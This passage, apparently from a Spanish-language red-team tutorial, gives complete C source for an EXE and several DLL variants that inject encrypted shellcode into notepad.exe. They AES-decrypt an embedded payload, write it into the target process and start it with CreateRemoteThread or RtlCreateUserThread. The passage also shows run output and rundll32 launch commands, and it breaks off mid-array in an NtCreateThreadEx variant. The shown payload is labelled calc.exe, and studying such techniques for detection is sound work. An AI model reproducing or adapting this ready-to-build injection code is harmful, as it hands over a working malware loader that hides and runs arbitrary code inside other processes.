0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido
                
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("Process Found!\n");
                        break;
                }
        }
                
        CloseHandle(hProcSnap); //se cierra el snapshot
                
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	// Inyeccion tipo2 pRtlCreateUserThread
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	// Inyeccion tipo2 pRtlCreateUserThread
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}



int main(void) {
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}

```
Salida de la ejecución:

```
eexternal_injection_exe_3.exe
[FindProcess: ] System
[FindProcess: ] Registry
[FindProcess: ] smss.exe
[FindProcess: ] csrss.exe
[FindProcess: ] wininit.exe
[FindProcess: ] csrss.exe
[FindProcess: ] winlogon.exe
[FindProcess: ] services.exe
[FindProcess: ] lsass.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dwm.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] Memory Compression
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] spoolsv.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ruby.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] wlms.exe
[FindProcess: ] MsMpEng.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sppsvc.exe
[FindProcess: ] NisSrv.exe
[FindProcess: ] sihost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] taskhostw.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ctfmon.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] explorer.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ShellExperienceHost.exe
[FindProcess: ] SearchUI.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SkypeApp.exe
[FindProcess: ] YourPhone.exe
[FindProcess: ] SkypeBackgroundHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SppExtComObj.Exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] smartscreen.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] cmd.exe
[FindProcess: ] conhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SearchIndexer.exe
[FindProcess: ] SecurityHealthSystray.exe
[FindProcess: ] SecurityHealthService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxTray.exe
[FindProcess: ] WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
[FindProcess: ] OneDrive.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] ApplicationFrameHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WinStore.App.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SystemSettings.exe
[FindProcess: ] SgrmBroker.exe
[FindProcess: ] uhssvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WmiPrvSE.exe
[FindProcess: ] notepad++.exe
[FindProcess: ] svchost.exe
[FindProcess: ] TrustedInstaller.exe
[FindProcess: ] TiWorker.exe
[FindProcess: ] vctip.exe
[FindProcess: ] notepad.exe
Process Found!
Notepad.exe PID = 7856

```

Evidencia de la inyección:

![inyección_proceso_externo](/assets/images/inyeccion_proceso_externo_3.png)



### Codigo fuente asociado a Dlls

#### Dll CreateRemoteThread()

Código asociado al binario:
```c
#include <winternl.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


extern "C" {

int AESDecrypt(byte * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
		DWORD * pointer_len = (DWORD *)&payload_len; 
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, pointer_len)){
                return -1;
        }
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);  
        return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido
                
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("Process Found!\n");
                        break;
                }
        }
                
        CloseHandle(hProcSnap); //se cierra el snapshot
                
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	AESDecrypt((byte *) payload, payload_len, key, sizeof(key));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Ejecución:
```
rundll32.exe external_injection_dll_1.dll,f0ns1
```


#### Dll pRtlCreateUserThread()

Código asociado al binario:
```c
#include <winternl.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


extern "C" {

int AESDecrypt(byte * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
		DWORD * pointer_len = (DWORD *)&payload_len; 
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, pointer_len)){
                return -1;
        }
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);  
        return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido
                
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("Process Found!\n");
                        break;
                }
        }
                
        CloseHandle(hProcSnap); //se cierra el snapshot
                
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	// Inyeccion tipo2 pRtlCreateUserThread
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	// Inyeccion tipo2 pRtlCreateUserThread
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
ejecución:
```
rundll32.exe external_injection_dll_2.dll,f0ns1
```

#### Dll pNtCreateThreadEx()

Código asociado al binario:
```c
#include <winternl.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 